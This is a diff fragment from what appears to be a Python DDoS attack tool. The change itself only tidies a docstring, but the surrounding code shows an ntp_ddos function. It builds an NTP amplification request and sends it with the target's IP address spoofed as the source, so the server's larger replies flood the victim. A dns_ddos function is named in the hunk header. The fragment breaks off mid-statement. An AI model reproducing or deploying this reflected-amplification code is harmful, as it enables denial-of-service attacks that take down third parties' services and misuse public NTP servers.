@@ -40,7 +40,7 @@ def dns_ddos(target, dns_server):
 
 def ntp_ddos(target, ntp_server):
     """
-    Send a NTP request to the NTP server with the spoofed IP address of the target to perform a reflected DDoS. 10.
+    Send a NTP request to the NTP server with the spoofed IP address of the target to perform a reflected DDoS.
     """
     data = "\x17\x00\x03\x2a" + "\x00" * 4
     packet = IP(dst=ntp_server, src=target) / \
